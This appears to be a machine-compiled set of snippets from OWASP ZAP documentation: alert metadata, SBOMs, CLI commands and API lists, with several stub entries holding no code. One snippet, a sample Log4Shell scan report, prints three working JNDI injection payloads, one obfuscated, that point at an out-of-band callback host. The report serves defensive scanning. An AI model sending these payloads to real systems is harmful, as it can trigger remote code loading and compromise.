public boolean canParseResource(ParseContext ctx, boolean wasAlreadyParsed) {
    return ctx.getPath().endsWith(".DS_Store")
            && startsWith(ctx.getHttpMessage().getResponseBody().getBytes(), MAGIC_BYTES);
}

----------------------------------------

TITLE: Defining YAML Frontmatter for ZAP Release Notes
DESCRIPTION: YAML frontmatter defining metadata for the ZAP 2.14.0 release notes page, including title, type, and weight.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Release 2.14.0
type: userguide
weight: 3
---

----------------------------------------

TITLE: Identifying Authentication Requests in Java for ZAP
DESCRIPTION: This code implements a passive scan rule to identify authentication requests in web applications. It looks for common username and password field names, analyzes URL segments, and can update the context with the detected authentication method.

LANGUAGE: java
CODE:
// Latest code: AuthenticationDetectionScanRule.java
// Full implementation details not provided in the given text

----------------------------------------

TITLE: Defining YAML Metadata for Session ID in URL Rewrite Alert
DESCRIPTION: YAML frontmatter defining metadata for the 'Session ID in URL Rewrite' alert, including risk level, solution, references, and associated tags.

LANGUAGE: yaml
CODE:
---
title: "Session ID in URL Rewrite"
alertid: 3-2
alertindex: 302
alerttype: "Passive"
alertcount: 3
status: release
type: alert
risk: Medium
solution: "For secure content, put session ID in a cookie. To be even more secure consider using a combination of cookie and URL rewrite."
references:
   - https://seclists.org/webappsec/2002/q4/111
other: ""
cwe: 598
wasc: 13
alerttags: 
  - CWE-598
  - OWASP_2017_A03
  - OWASP_2021_A01
  - WSTG-v42-SESS-04
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InfoSessionIdUrlScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/InfoSessionIdUrlScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-3
---

----------------------------------------

TITLE: Defining ZAP Team Page Metadata in Markdown
DESCRIPTION: YAML frontmatter metadata block defining the page title and content type for the ZAP team member listing page.

LANGUAGE: markdown
CODE:
---
title: "ZAP Team"
type: team
---

----------------------------------------

TITLE: Link to Fetch Metadata Headers Validation Implementation
DESCRIPTION: Reference to Java implementation for validating Fetch metadata request headers that help implement resource isolation policies.

LANGUAGE: markdown
CODE:
[FetchMetadataRequestHeadersScanRule.java](https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/FetchMetadataRequestHeadersScanRule.java)

----------------------------------------

TITLE: Configuring ZAP Team Profile in YAML
DESCRIPTION: YAML configuration block defining the ZAP project team properties including project handle, display name, roles, social media handles and weight for sorting.

LANGUAGE: yaml
CODE:
handle: zaproxy
name: "ZAP by Checkmarx"
roles: The ZAP Project
author: zaproxy
type: team
github: zaproxy
mastodon: https://infosec.exchange/@zaproxy
bluesky: https://bsky.app/profile/zaproxy.org
weight: 1

----------------------------------------

TITLE: Implementing Insecure HTTP Method Scan in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that implements a scan rule for detecting insecure HTTP methods. It likely includes methods for sending HTTP requests with various methods and analyzing the responses to identify potential vulnerabilities.

LANGUAGE: java
CODE:
// Code not provided in the original text, but referenced at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/InsecureHttpMethodScanRule.java

----------------------------------------

TITLE: Accessing Custom Script Variables in JavaScript
DESCRIPTION: Demonstrates how to get and set custom global and script variables in ZAP scripts using JavaScript. Variables can be of any type including complex objects and arrays.

LANGUAGE: javascript
CODE:
var ScriptVars = Java.type("org.zaproxy.zap.extension.script.ScriptVars")

ScriptVars.setScriptCustomVar(this.context, "var.name", {x: 1, y: 3})
print(ScriptVars.getScriptCustomVar(this.context, "var.name").y) // Prints 3

ScriptVars.setGlobalCustomVar("var.name", ["A", "B", "C", "D"])
print(ScriptVars.getGlobalCustomVar("var.name")[2]) // Prints C

----------------------------------------

TITLE: ZAP Security Rules Configuration
DESCRIPTION: TSV configuration file for customizing ZAP security rule behaviors by setting specific rules to IGNORE status.

LANGUAGE: tsv
CODE:
10035	IGNORE	(Strict-Transport-Security Header Not Set)
10098	IGNORE	(Cross-Domain Misconfiguration)

----------------------------------------

TITLE: CORS Alert Configuration in YAML
DESCRIPTION: YAML configuration for CORS misconfiguration alert defining alert properties, risk level, references, and associated security standards.

LANGUAGE: yaml
CODE:
title: "CORS Misconfiguration"
alertid: 40040-2
alertindex: 4004002
alerttype: "Active"
alertcount: 3
status: beta
type: alert
risk: Medium
solution: "If a web resource contains sensitive information, the origin should be properly specified in the Access-Control-Allow-Origin header. Only trusted websites needing this resource should be specified in this header, with the most secured protocol supported."
references:
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
   - https://portswigger.net/web-security/cors
other: ""
cwe: 942
wasc: 14
alerttags: 
  - CWE-942
  - OWASP_2017_A05
  - OWASP_2021_A01
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - WSTG-v42-CLNT-07
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/CorsScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/CorsScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-beta/#id-40040

----------------------------------------

TITLE: Cloud Metadata Alert Configuration in YAML
DESCRIPTION: YAML configuration for ZAP security alert that defines the alert properties, risk level, solution, and related references for cloud metadata exposure detection.

LANGUAGE: yaml
CODE:
title: "Cloud Metadata Potentially Exposed"
alertid: 90034
alertindex: 9003400
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: High
solution: "Do not trust any user data in NGINX configs. In this case it is probably the use of the $host variable which is set from the 'Host' header and can be controlled by an attacker."
references:
   - https://www.nginx.com/blog/trust-no-one-perils-of-trusting-user-input/
other: "Based on the successful response status code cloud metadata may have been returned in the response. Check the response data to see if any cloud metadata has been returned. The meta data returned can include information that would allow an attacker to completely compromise the system."
alerttags: 
  - OWASP_2017_A06
  - OWASP_2021_A05
  - POLICY_API
  - POLICY_QA_FULL
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/CloudMetadataScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/CloudMetadataScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules/#id-90034

----------------------------------------

TITLE: Running ZAP with Custom Port and Environment Variable
DESCRIPTION: This command runs ZAP with Webswing support, sets a custom port (9090) using an environment variable, and maps the current directory for certificate access.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -e ZAP_WEBSWING_OPTS="-host 0.0.0.0 -port 9090" -u zap -p 8080:8080 -p 9090:9090 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh

----------------------------------------

TITLE: YAML Frontmatter Configuration for BIRT Reports Documentation
DESCRIPTION: YAML frontmatter configuration that defines metadata for the BIRT Reports documentation page, including title, type, weight and add-on details.

LANGUAGE: yaml
CODE:
title: BIRT Reports
type: userguide
weight: 1
cascade:
  addon:
    id: birtreports
    version: 3.0.0

----------------------------------------

TITLE: Implementing ELMAH Information Leak Detection in Java
DESCRIPTION: This code snippet is part of ZAP's active scan rules, specifically for detecting ELMAH information leaks. It is implemented in the ElmahScanRule.java file within the org.zaproxy.zap.extension.ascanrules package.

LANGUAGE: java
CODE:
// The actual code is not provided in the given text, but it would be located at:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/ElmahScanRule.java

----------------------------------------

TITLE: Pie Chart Template Shortcodes in Hugo Markdown
DESCRIPTION: A series of Hugo shortcode calls that render pie charts for different ZAP usage metrics including geographical distribution, operating systems, ZAP types, and container usage.

LANGUAGE: markdown
CODE:
{{< pie-chart name="countries-last-month">}}

{{< pie-chart name="countries-desktop-last-month">}}

{{< pie-chart name="os-last-month">}}

{{< pie-chart name="os-desktop-last-month">}}

{{< pie-chart name="zaptype-last-month">}}

{{< pie-chart name="container-last-month">}}

----------------------------------------

TITLE: Defining Custom Payloads API Actions in Markdown
DESCRIPTION: Specifies the available actions in the Custom Payloads API, including methods to add, enable, disable, and remove custom payloads, as well as manage payload categories.

LANGUAGE: markdown
CODE:
### Actions

* addCustomPayload (category\*, payload): Adds a custom payload (enabled when added).
* disableCustomPayloads(category): Disables custom payloads. Optionally limited by category. (No category means all)
* enableCustomPayloads(category): Enables custom payloads. Optionally limited by category. (No category means all)
* enableCustomPayload (category\*, payload): Enables a custom payload.
* disableCustomPayload (category\*, payload): Disables a custom payload.
* removeCustomPayload (category\*, payload): Removes a custom payload.

**Note: \*** Required parameter.

----------------------------------------

TITLE: Sample JSON Output from ZAP Log4Shell Scan
DESCRIPTION: Example JSON output from a successful ZAP scan detecting Log4Shell vulnerability, showing alert details and evidence.

LANGUAGE: json
CODE:
{
	"@version": "2.11.1",
	"@generated": "Mon, 13 Dec 2021 15:53:57",
	"site":[ 
		{
			"@name": "http://localhost:8000",
			"@host": "localhost",
			"@port": "8000",
			"@ssl": "false",
			"alerts": [ 
				{
					"pluginid": "40043",
					"alertRef": "40043",
					"alert": "Log4Shell (CVE-2021-44228)",
					"name": "Log4Shell (CVE-2021-44228)",
					"riskcode": "3",
					"confidence": "2",
					"riskdesc": "High (Medium)",
					"desc": "<p>Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.</p>",
					"instances":[ 
						{
							"uri": "http://localhost:8000/",
							"method": "GET",
							"param": "X-Api-Version",
							"attack": "${jndi:dns://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu/abc}",
							"evidence": "DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1"
						},
						{
							"uri": "http://localhost:8000/",
							"method": "GET",
							"param": "X-Api-Version",
							"attack": "${jndi:${lower:l}${lower:d}a${lower:p}://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu/abc}",
							"evidence": "DNS_A http://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu. HTTP/1.1"
						},
						{
							"uri": "http://localhost:8000/",
							"method": "GET",
							"param": "X-Api-Version",
							"attack": "${jndi:ldap://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu/abc}",
							"evidence": "DNS_A http://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu. HTTP/1.1"
						}
					],
					"count": "3",
					"solution": "<p>Upgrade Log4j2 to version 2.15.0 or newer. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".</p>",
					"otherinfo": "<p></p><p>Request</p><p>DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1</p><p></p><p>;; opcode: QUERY, status: NOERROR, id: 38751</p><p>;; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</p><p></p><p>;; QUESTION SECTION:</p><p>;7fiivcu3eqx4dozvlnwkofl3te.odiss.eu.\tIN\t A</p><p></p><p>;; ADDITIONAL SECTION:</p><p></p><p>;; OPT PSEUDOSECTION:</p><p>; EDNS: version 0; flags: ; udp: 1400</p><p></p><p>Response</p><p>HTTP/1.0 0</p><p></p><p></p><p>--------------------------------</p>",
					"reference": "<p>https://www.cve.org/CVERecord?id=CVE-2021-44228</p><p>https://www.lunasec.io/docs/blog/log4j-zero-day/</p><p>https://nvd.nist.gov/vuln/detail/CVE-2021-44228</p>",
					"cweid": "117",
					"wascid": "20",
					"sourceid": "102"
				}
			]
		}
	]
}

----------------------------------------

TITLE: Setting JVM Memory Options in ZAP
DESCRIPTION: Examples of Java memory allocation pool size configurations that can be used in ZAP's JVM options. These values determine the maximum heap size available to the application.

LANGUAGE: shell
CODE:
-Xmx256m

LANGUAGE: shell
CODE:
-Xmx512m

LANGUAGE: shell
CODE:
-Xmx1024m

----------------------------------------

TITLE: Detecting Server Side Template Injection in Java
DESCRIPTION: This code snippet is part of the SstiScanRule class in ZAP, which implements the logic for detecting Server Side Template Injection vulnerabilities during active scanning.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SstiScanRule.java

----------------------------------------

TITLE: Link to Example File Passive Scan Implementation
DESCRIPTION: Reference to Java implementation of an example passive scan rule that loads strings from a user-editable file.

LANGUAGE: markdown
CODE:
[ExampleFilePassiveScanRule.java](https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/ExampleFilePassiveScanRule.java)

----------------------------------------

TITLE: Importing Postman Variables in ZAP
DESCRIPTION: Example of how to format variables when importing a Postman collection into ZAP. Variables are entered as key-value pairs separated by commas.

LANGUAGE: plaintext
CODE:
key1=value1,key2=value2,...

----------------------------------------

TITLE: YAML Front Matter for Documentation Page
DESCRIPTION: YAML configuration block defining the page title, type and cascade properties for the documentation contribution page.

LANGUAGE: yaml
CODE:
---
title: "Contribute: Documentation"
type: page
cascade:
  EditableContent: true
  addBreadcrumbs: true
---

----------------------------------------

TITLE: Specifying ZAP Java API Maven Coordinates
DESCRIPTION: Maven coordinates for the ZAP Java API, which is now distributed separately from the main ZAP release. The API can be included in Maven projects using these group, artifact, and version identifiers.

LANGUAGE: text
CODE:
* GroupId: 'org.zaproxy'
* ArtifactId: 'zap-clientapi'
* Version: '1.0.0'

----------------------------------------

TITLE: Configuring Kotlin Add-on in YAML
DESCRIPTION: YAML configuration block that specifies the add-on title, type, weight and addon properties including ID and version.

LANGUAGE: yaml
CODE:
title: Kotlin Support
type: userguide
weight: 1
cascade:
  addon:
    id: kotlin
    version: 1.1.0

----------------------------------------

TITLE: Alert Configuration YAML Definition
DESCRIPTION: YAML configuration defining the security alert properties including risk level, solution recommendations, and associated technical tags for the Trace.axd information leak vulnerability.

LANGUAGE: yaml
CODE:
title: "Trace.axd Information Leak"
alertid: 40029
alertindex: 4002900
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Consider whether or not Trace Viewer is actually required in production, if it isn't then disable it. If it is then ensure access to it requires authentication and authorization."
references:
   - https://msdn.microsoft.com/en-us/library/bb386420.aspx
   - https://msdn.microsoft.com/en-us/library/wwh16c6c.aspx
   - https://www.dotnetperls.com/trace
other: ""
cwe: 215
wasc: 13
techtags: 
  - Db.Microsoft_SQL_Server
  - Language.ASP
  - OS.Windows
  - WS.IIS
alerttags: 
  - OWASP_2017_A06
  - OWASP_2021_A05
  - POLICY_QA_FULL
  - WSTG-v42-CONF-05

----------------------------------------

TITLE: Rendering Bar Chart for ZAP User Group Activity in Markdown
DESCRIPTION: This snippet renders a bar chart displaying user group activity statistics for ZAP using a custom chart shortcode. The chart is not stacked, unlike the previous charts.

LANGUAGE: markdown
CODE:
{{< chart name="user-group" stacked="false">}}

----------------------------------------

TITLE: Accessing BOAST Server Information with JavaScript in ZAP
DESCRIPTION: This script, named 'OAST Get BOAST Servers.js', demonstrates how to interact with BOAST from a ZAP script. It prints all available information related to registered BOAST servers, enabling users to write scripts that utilize BOAST payloads and canary values for out-of-band attacks.

LANGUAGE: javascript
CODE:
// OAST Get BOAST Servers.js
// Script content not provided in the original text

----------------------------------------

TITLE: YAML Alert Configuration for SSTI Blind Scanner
DESCRIPTION: YAML configuration defining the alert properties for the Server Side Template Injection blind scanner, including risk level, solution guidance, and associated security standards like CWE and WASC.

LANGUAGE: yaml
CODE:
title: "Server Side Template Injection (Blind)"
alertid: 90036
alertindex: 9003600
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: High
solution: "Instead of inserting the user input in the template, use it as rendering argument."
references:
   - https://portswigger.net/blog/server-side-template-injection
other: ""
cwe: 1336
wasc: 20
alerttags: 
  - CWE-1336
  - OUT_OF_BAND
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API
  - POLICY_DEV_FULL
  - POLICY_QA_FULL
  - POLICY_SEQUENCE
  - WSTG-v42-INPV-18

----------------------------------------

TITLE: Authors Data Structure Example
DESCRIPTION: YAML configuration example for site authors data.

LANGUAGE: yaml
CODE:
---
- name: 'Simon Bennets'
  picture: 'https://pbs.twimg.com/profile_images/2186782633/simonbennetts2_400x400.jpg'
  twitter: '@psiinon'
  is_core: true

- name: 'David Scrobonia'
  picture: 'https://pbs.twimg.com/profile_images/1132029219876347904/FYA3rHRq_400x400.png'
  twitter: '@david_scrobonia'
  is_core: true

----------------------------------------

TITLE: Checking ZAP Package Availability in Winget
DESCRIPTION: Command to verify ZAP package availability in the Windows Package Manager repository.

LANGUAGE: shell
CODE:
winget show ZAP.ZAP

----------------------------------------

TITLE: Configuring ZAP Scan Links in YAML
DESCRIPTION: This YAML configuration defines metadata and a list of links to various web security testing resources. It includes test applications, vulnerable websites, and benchmarking tools for automated scanning with ZAP.

LANGUAGE: yaml
CODE:
---
title: "ZAP Scans"
type: page
layout: links
links:
  - name: 'ZAP Authentication Tests'
    link: auth
    desc: a set of authentication test cases
  - name: 'Google Firing Range'
    link: firingrange
    desc: a test bed for automated web application security scanners (unmaintained)
  - name: 'Google Security Crawl Maze'
    link: crawlmaze
    desc: a comprehensive testbed for web security crawlers (maintained)
  - name: 'OWASP Benchmark'
    link: benchmark
    desc: a test suite designed to verify the speed and accuracy of software vulnerability detection tools
  - name: 'OWASP Juice Shop'
    link: juiceshop
    desc: a deliberately vulnerable modern web app (maintained)
  - name: 'Websites Vulnerable to SSTI'
    link: ssti
    desc: a set of simple servers which are vulnerable to Server Side Template Injection (maintained)
  - name: 'Yahoo Webseclab'
    link: webseclab
    desc: a set of web security test cases (unmaintained)
EditableContent: true
cascade:
  addBreadcrumbs: true

----------------------------------------

TITLE: ZAP Daemon Mode Example
DESCRIPTION: Starting ZAP in daemon mode with a new session

LANGUAGE: shell
CODE:
<zap-script> -daemon -newsession session

----------------------------------------

TITLE: API Endpoints for Revisit Add-on in ZAP
DESCRIPTION: Lists the available API endpoints for the Revisit add-on, including view and action methods for managing revisit functionality on specific sites.

LANGUAGE: markdown
CODE:
revisit / view / revisitList Returns the list of sites enabled for revisit  
revisit / action / revisitSiteOn Turns revisit on for the specified site. Dates must use the format: "yyyy/MM/dd HH:mm:ss"  
revisit / action / revisitSiteOff Turns revisit off for the specified site

----------------------------------------

TITLE: OAST API Views
DESCRIPTION: Read-only API endpoints for retrieving OAST configuration and service information

LANGUAGE: markdown
CODE:
* getActiveScanService: Gets the service used with the active scanner, if any.
* getBoastOptions: Gets the BOAST options.
* getCallbackOptions: Gets the Callback options.
* getDaysToKeepRecords: Gets the number of days the OAST records will be kept for.
* getInteractshOptions: Gets the Interactsh options.
* getServices: Gets all of the services.

----------------------------------------

TITLE: Scanning for Exposed .htaccess Files in Apache Web Servers
DESCRIPTION: Java implementation of a security scan rule that checks for accessible .htaccess files, which could expose sensitive Apache web server configuration details. Part of the ZAP Active Scanner ruleset, this scan helps identify potential information leaks that violate security policies and best practices.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/HtAccessScanRule.java

----------------------------------------

TITLE: Defining YAML Front Matter for Eval Villain Add-on SBOM
DESCRIPTION: This YAML code defines the front matter for the Eval Villain Add-on SBOM page. It includes metadata such as title, type, weight, and cascade information for the add-on ID and version. It also specifies the SBOM format, download URL, and lists all the components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Eval Villain Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: evalvillain
    version: 0.4.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/evalvillain-v0.4.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: asm
    version: '9.6'
    licenses: BSD-3-Clause
  - name: asm-commons
    version: '9.6'
    licenses: BSD-3-Clause
  - name: asm-tree
    version: '9.6'
    licenses: BSD-3-Clause
  - name: auto-common
    version: 1.2.2
    licenses: Apache-2.0
  - name: auto-service-annotations
    version: 1.0.1
    licenses: Apache-2.0
  - name: auto-value-annotations
    version: '1.9'
    licenses: Apache-2.0
  - name: caffeine
    version: 3.0.5
    licenses: Apache-2.0
  - name: checker-qual
    version: 3.33.0
    licenses: MIT
  - name: commons-beanutils
    version: 1.9.4
    licenses: Apache-2.0
  - name: commons-codec
    version: 1.16.1
    licenses: Apache-2.0
  - name: commons-collections
    version: 3.2.2
    licenses: Apache-2.0
  - name: commons-configuration
    version: '1.10'
    licenses: Apache-2.0
  - name: commons-csv
    version: 1.10.0
    licenses: Apache-2.0
  - name: commons-httpclient
    version: '3.1'
    licenses: Apache-1.0
  - name: commons-io
    version: 2.16.1
    licenses: Apache-2.0
  - name: commons-lang
    version: '2.6'
    licenses: Apache-2.0
  - name: commons-lang3
    version: 3.14.0
    licenses: Apache-2.0
  - name: commons-logging
    version: '1.2'
    licenses: Apache-2.0
  - name: commons-logging
    version: 1.3.1
    licenses: Apache-2.0
  - name: commons-text
    version: 1.12.0
    licenses: Apache-2.0
  - name: dataflow-errorprone
    version: 3.41.0-eisop1
    licenses: GNU General Public License, version 2 (GPL2), with the classpath exception
  - name: error_prone_annotation
    version: 2.26.1
    licenses: Apache-2.0
  - name: error_prone_annotations
    version: 2.26.1
    licenses: Apache-2.0
  - name: error_prone_check_api
    version: 2.26.1
    licenses: Apache-2.0
  - name: error_prone_core
    version: 2.26.1
    licenses: Apache-2.0
  - name: error_prone_type_annotations
    version: 2.26.1
    licenses: Apache-2.0
  - name: ezmorph
    version: 1.0.6
    licenses: Apache-2.0
  - name: failureaccess
    version: 1.0.1
    licenses: Apache-2.0
  - name: flatlaf
    version: 3.4.1
    licenses: Apache-2.0
  - name: guava
    version: 32.1.1-jre
    licenses: Apache-2.0
  - name: guice
    version: 5.1.0
    licenses: Apache-2.0
  - name: harlib
    version: 1.1.3
    licenses: Apache-2.0
  - name: hsqldb
    version: 2.7.2
    licenses: HSQLDB License, a BSD open source license
  - name: jackson-core-asl
    version: 1.9.13
    licenses: Apache-2.0
  - name: java-diff-utils
    version: '4.12'
    licenses: Apache-2.0
  - name: java-semver
    version: 0.10.2
    licenses: MIT
  - name: javac
    version: 9+181-r4173-1
    licenses: GPL-2.0-with-classpath-exception
  - name: javahelp
    version: 2.0.05
    licenses: GNU General Public License - Version 2 with the class path exception
  - name: javax.inject
    version: '1'
    licenses: Apache-2.0
  - name: jericho-html
    version: '3.4'
    licenses: GNU Lesser General Public License (LGPL), Apache-1.0, EPL-1.0
  - name: jfreechart
    version: 1.5.4
    licenses: GNU Lesser General Public Licence
  - name: jgrapht-core
    version: 0.9.0
    licenses: LGPL-2.1-only, EPL-1.0
  - name: json-lib
    version: '2.4'
    licenses: Apache-2.0
  - name: jsr305
    version: 3.0.2
    licenses: Apache-2.0
  - name: log4j-1.2-api
    version: 2.20.0
    licenses: Apache-2.0
  - name: log4j-api
    version: 2.20.0
    licenses: Apache-2.0
  - name: log4j-core
    version: 2.20.0
    licenses: Apache-2.0
  - name: log4j-jul
    version: 2.20.0
    licenses: Apache-2.0
  - name: lombok
    version: 1.18.34
    licenses: MIT
  - name: org.jacoco.agent
    version: 0.8.11
    licenses: EPL-2.0
  - name: org.jacoco.ant
    version: 0.8.11
    licenses: EPL-2.0
  - name: org.jacoco.core
    version: 0.8.11
    licenses: EPL-2.0
  - name: org.jacoco.report
    version: 0.8.11
    licenses: EPL-2.0
  - name: pcollections
    version: 4.0.1
    licenses: MIT
  - name: protobuf-java
    version: 3.19.6
    licenses: BSD-3-Clause
  - name: rsyntaxtextarea
    version: 3.4.0
    licenses: BSD-3-Clause
  - name: software-and-algorithms
    version: '1.0'
    licenses: MIT
  - name: swingx-all
    version: 1.6.5-1
    licenses: Lesser General Public License (LGPL)
  - name: xom
    version: 1.3.9
    licenses: The GNU Lesser General Public License, Version 2.1
  - name: zap
    version: 2.15.0
    licenses: Apache-2.0

----------------------------------------

TITLE: Defining Markdown Frontmatter for Network Add-on Documentation
DESCRIPTION: This code snippet defines the frontmatter for the Network Add-on documentation page. It specifies the title, type, weight, and cascading addon information.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: Network Add-on
type: userguide
weight: 1
cascade:
  addon:
    id: network
    version: 0.21.0
---

----------------------------------------

TITLE: Uninstalling JxBrowser Add-on in ZAP using Bash
DESCRIPTION: This command demonstrates how to uninstall the JxBrowser add-on from ZAP using the command line interface. It uses the -addonuninstall flag followed by the add-on name.

LANGUAGE: bash
CODE:
./zap.sh -addonuninstall jxbrowser

----------------------------------------

TITLE: GET for POST Security Scanner Implementation in Java
DESCRIPTION: Java implementation of a security scanner that checks if POST endpoints incorrectly accept GET requests. The scanner is part of ZAP's active scan rules and helps identify potential security configuration issues.

LANGUAGE: java
CODE:
// Referenced code available at:\nhttps://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/GetForPostScanRule.java

----------------------------------------

TITLE: Reference to Access Control Scanner Implementation
DESCRIPTION: Reference to the Java implementation file containing the access control scanning logic that checks for improper authentication and authorization.

LANGUAGE: text
CODE:
AccessControlScannerThread.java

----------------------------------------

TITLE: Setting and Getting Script Variables by Name
DESCRIPTION: Alternative method for setting and getting script variables by explicitly specifying the script name, useful for languages without ScriptContext access.

LANGUAGE: javascript
CODE:
org.zaproxy.zap.extension.script.ScriptVars.setScriptVar("ScriptName", "var.name","value")
org.zaproxy.zap.extension.script.ScriptVars.getScriptVar("ScriptName", "var.name")

----------------------------------------

TITLE: Updating ZAP 2.12.0 via Command Line
DESCRIPTION: Command to update ZAP 2.12.0 on the command line to resolve add-on updating issues. This workaround involves updating ZAP and then restarting it.

LANGUAGE: bash
CODE:
zap.sh -cmd -addonupdate

----------------------------------------

TITLE: Markdown Page Configuration and Template Usage
DESCRIPTION: Front matter configuration for a statistics page and template inclusion for displaying active scan rule data

LANGUAGE: markdown
CODE:
---
type: page
title: Active Scan Rule Stats Last Month
---

{{< ascan-rules >}}

----------------------------------------

TITLE: Configuring Homepage Metadata in YAML
DESCRIPTION: YAML front matter configuration that sets up the homepage metadata including social preview, description, summary, title and banner image.

LANGUAGE: yaml
CODE:
addSocialPreview: true
description: Welcome to ZAP!
summary: Welcome to ZAP!
title: The ZAP Homepage
images:
- https://www.zaproxy.org/img/zap-banner.png

----------------------------------------

TITLE: YAML Configuration for Save Raw Message Documentation
DESCRIPTION: YAML frontmatter configuration for the Save Raw Message documentation page, specifying add-on metadata and page properties.

LANGUAGE: yaml
CODE:
title: Save Raw Message
type: userguide
weight: 1
cascade:
  addon:
    id: saverawmessage
    version: 7.0.0

----------------------------------------

TITLE: Implementing CORS Scan Rule in Java for ZAP
DESCRIPTION: This code snippet refers to the implementation of the CORS Scan Rule in ZAP. It is located in the CorsScanRule.java file within the ascanrulesBeta extension. The rule is designed to detect and report issues related to CORS headers in web applications.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/CorsScanRule.java

----------------------------------------

TITLE: Configuring YAML SBOM for Call Home Add-on
DESCRIPTION: YAML configuration defining the Software Bill of Materials (SBOM) for the Call Home Add-on. Includes metadata about the add-on version, SBOM format, download URL, and a detailed list of component dependencies with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Call Home Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: callhome
    version: 0.14.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/callhome-v0.14.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Parameter Placeholders for Application Invocation in ZAP
DESCRIPTION: This snippet lists the available parameter placeholders that can be used when configuring application invocation in ZAP. These placeholders allow dynamic insertion of request data into the command parameters.

LANGUAGE: markdown
CODE:
|   |                       |                                                                                                                                            |
|---|-----------------------|--------------------------------------------------------------------------------------------------------------------------------------------|
|   | %url%                 | the full url, e.g. 'http://localhost/test?a=b'                                                                                             |
|   | %site%                | the site, e.g. 'http://localhost:8080/'                                                                                                    |
|   | %host%                | the hostname, e.g. 'localhost'                                                                                                             |
|   | %port%                | the port, e.g. '80'                                                                                                                        |
|   | %cookie%              | the first cookie field from the request header (if any)                                                                                    |
|   | %postdata%            | the POST data sent, if any, with any newlines replaced with "\\n"                                                                          |
|   | %msgid%               | the HTTP message id to fetch data from the API (/JSON/core/view/message/?id=$msgid), does not alway exist, will return -1 if no message id |
|   | %header-{{ header }}% | the request header by name (if any), e.g. `%header-user-agent%` would return the value of the User-Agent header                            |

----------------------------------------

TITLE: Example URLs with URL Parameters
DESCRIPTION: Sample URLs showing traditional web application structure with parameters in query strings.

LANGUAGE: plaintext
CODE:
https://www.example.com/app/aaa?ddd=eee
https://www.example.com/app/aaa?ddd=fff
https://www.example.com/app/bbb?ddd=eee

----------------------------------------

TITLE: Access Control API Endpoints
DESCRIPTION: API endpoints exposed by the Access Control add-on for scanning and report generation.

